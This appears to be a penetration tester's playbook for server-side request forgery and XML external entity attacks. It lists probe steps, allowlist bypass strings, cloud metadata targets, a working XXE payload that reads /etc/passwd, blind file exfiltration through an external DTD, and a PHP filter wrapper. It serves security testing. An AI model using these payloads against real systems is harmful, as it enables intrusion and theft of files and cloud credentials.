# Playbook: SSRF and XXE

Both are "the server fetches something for you". Both escalate through metadata and internal services.

---

## SSRF

Signals: `url=`, `webhook`, `feed`, `import`, `avatar`, `screenshot`, `pdf`, `proxy`, `preview`, `oembed`,
`fetch`, XML with external entities, image optimisers, link unfurlers.

Probe order:
1. Your own listener — confirm the fetch happens at all
2. `http://127.0.0.1:<port>` sweep on common service ports
3. Metadata: AWS IMDSv1, GCP, Azure, Alibaba, DigitalOcean
4. `file:///etc/passwd`, `file:///c:/windows/win.ini`
5. Internal hostnames from the JS and asset model
6. `gopher://` for Redis/MySQL/SMTP smuggling
7. Redirect to internal, then DNS rebinding if allowlisted

Allowlist bypass: `http://target.com@127.0.0.1`, `http://127.0.0.1#@target.com`,
`http://[::1]`, decimal `2130706433`, octal `0177.0.0.1`, `127.1`, DNS with short TTL, `nip.io`,
CNAME to internal, trailing dot, case, `%00`, backslash.

IMDSv2 requires `X-aws-ec2-metadata-token`. Check whether the fetcher forwards headers, and whether
`PUT` is possible.

## XXE

Any XML parser: SOAP, SAML, SVG, DOCX/XLSX, RSS, sitemap, config import, `Content-Type: application/xml`.

Classic:
```xml
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>
```
Blind: external DTD on your listener, parameter entities to exfil a file into a URL path.
PHP wrapper: `php://filter/convert.base64-encode/resource=index.php`.
Billion laughs for DoS; XInclude where DOCTYPE is stripped; SSRF via `SYSTEM "http://..."`.

## Rules

- Read-only first. Metadata credentials before shells.
- Always prove the fetch with a listener before guessing at internals.
- SSRF to a service you cannot speak is still a finding — report the reachability, not a fantasy RCE.
